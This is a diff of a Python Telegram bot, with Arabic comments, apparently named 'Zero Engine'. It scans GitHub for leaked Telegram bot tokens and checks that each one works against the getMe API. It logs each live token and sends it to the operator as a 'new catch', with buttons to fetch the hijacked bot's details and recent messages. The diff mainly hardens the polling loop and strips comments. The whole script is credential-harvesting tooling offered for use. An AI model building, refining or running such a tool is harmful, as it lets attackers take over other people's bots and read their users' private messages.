@@ -11,17 +11,14 @@ FOUND_FILE = "found.txt"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# --- نظام الكيبورد التفاعلي (Dashboard) ---
+# --- نظام الكيبورد التفاعلي ---
 def get_markup(token):
     markup = types.InlineKeyboardMarkup()
-    # الصف الأول: التحكم في التوكن
     markup.add(types.InlineKeyboardButton("📋 معلومات البوت", callback_data=f"info|{token}"))
     markup.add(types.InlineKeyboardButton("📩 آخر الرسائل", callback_data=f"msg|{token}"))
-    # الصف الثاني: تصدير
     markup.add(types.InlineKeyboardButton("📤 تصدير الملف", callback_data="export"))
     return markup
 
-# --- معالجة الضغط على الخانات ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     if str(call.message.chat.id) != CHAT_ID: return
@@ -36,25 +33,35 @@ def callback_query(call):
     res = get_bot_info(token) if action == "info" else get_bot_messages(token)
     bot.send_message(CHAT_ID, f"نتائج {action}:\n{res[:4000]}")
 
-# --- محرك الصيد التلقائي ---
+# --- محرك الصيد ---
 def run_scanner():
-    print("Zero Engine: Scanning Online...")
     while True:
         try:
             tokens = search_for_tokens(GITHUB_TOKEN)
             for token in tokens:
-                # التحقق من عدم التكرار والفعالية
                 if not os.path.exists(FOUND_FILE) or token not in open(FOUND_FILE).read():
                     if requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5).status_code == 200:
-                        # إرسال الصيد مع الخانات (الكيبورد)
                         bot.send_message(CHAT_ID, f"🔥 صيد جديد:\n`{token}`", 
                                          parse_mode="Markdown", reply_markup=get_markup(token))
                         with open(FOUND_FILE, "a") as f: f.write(token + "\n")
         except: pass
-        time.sleep(60) # فحص كل دقيقة
+        time.sleep(60)
 
+# --- التشغيل الآمن ---
 if __name__ == "__main__":
-    # تشغيل الماسح في الخلفية
+    # 1. تنظيف أي اتصال سابق (الحل الجذري للخطأ 409)
+    try:
+        bot.remove_webhook()
+    except: pass
+    
+    # 2. تشغيل الماسح
     threading.Thread(target=run_scanner, daemon=True).start()
-    # تشغيل البوت
-    bot.infinity_polling()
+    
+    # 3. تشغيل البوت مع معالجة الأخطاء
+    print("Zero Engine: Online & Stable")
+    while True:
+        try:
+            bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
+        except Exception as e:
+            print(f"Polling Error: {e}")
+            time.sleep(15) # انتظر 15 ثانية ثم أعد المحاولة
